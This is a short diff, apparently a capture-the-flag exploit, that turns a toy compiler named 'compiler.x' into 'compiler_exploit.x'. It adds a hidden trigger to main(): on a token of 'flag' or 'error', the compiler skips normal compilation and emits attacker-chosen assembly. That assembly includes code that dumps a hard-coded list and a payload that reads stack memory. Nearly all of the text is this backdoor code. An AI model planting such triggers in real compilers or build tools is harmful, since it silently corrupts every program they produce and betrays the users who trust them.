@@ -1,0 +1,35 @@
+*** compiler.x
+--- compiler_exploit.x
+***************
+*** 587,594 ****
+--- 587,616 ----
+  	epilogue();
+  }
+  
++ list2str(v){
++ 	res = "[" + int2str(v[0]);
++ 	i = 1;
++ 	while(i < len(v)){
++ 		res = res + "," + int2str(v[i]); 
++ 		i = i + 1;
++ 	}
++ 	res = res + "]";
++ 	return res;
++ }
++ 
+  main() {
+  	s = tokenize();
++ 
++ 	if(s[0] == "flag"){
++ 		write("makelist #0 " + list2str(s[8]) + [10] + "mov sp 1" + [10] + "write" + [10] + "hlt" + [10]);
++ 		return 0;
++ 	}
++ 	else if(s[0] == "error"){
++ 		head = [123,456,789]; tail = [314,159,265];
++ 		write(head + list2str(head) + [10] + "mov bp[1] bp[34]" + [10] + "makelist bp[35] " + list2str(tail) + tail);
++ 		return 0;
++ 	}
++ 
+  	debug(s);
+  	prog = parse(s);
+  	debug(prog);
